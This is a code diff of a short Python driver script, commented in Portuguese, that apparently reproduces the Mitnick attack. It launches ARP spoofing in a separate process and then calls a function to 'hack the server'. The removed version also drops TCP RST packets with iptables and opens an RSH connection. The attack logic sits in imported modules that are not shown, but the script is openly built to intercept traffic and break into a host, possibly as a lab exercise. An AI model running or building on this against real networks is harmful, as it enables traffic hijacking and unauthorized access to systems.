@@ -1,28 +1,25 @@
-import arp_poisoning as ap
-import threading
-import os
+import mitnick
+import multiprocessing
 import time
+import configs_pc
+
+
+
 
 def main():
-    os.system(f'iptables -A FORWARD -p tcp --tcp-flags RST RST -j DROP')
-    
-    #criação de trhead
-    #ARPSPOOF
-    thread = threading.Thread(target=ap.net_spoof)
-    thread.daemon = True
-    thread.start()
-    print ("segunda trhead")
-    time.sleep(2.5)
+   interface = configs_pc.interface()
+   end_mac = configs_pc.end_mac()
+   configs_pc.arp_s() 
+ 
+   #ARPSPOOF
+   ThreadArp = multiprocessing.Process(target=mitnick.arp_spoofing, args=(interface, end_mac))
+   ThreadArp.start()
+   #dorme para garantir que as tabelas de IP já estejam preparadas
+   time.sleep(1.0)
+   # Hackeia o servidor
+   mitnick.invade(interface)
+   ThreadArp.terminate()
 
-
-
-    #conexao TCP e RSH
-    ap.conecta()
-    
-
-
-
-
-
-if __name__=="__main__":
+if __name__ == "__main__":
     main()
+
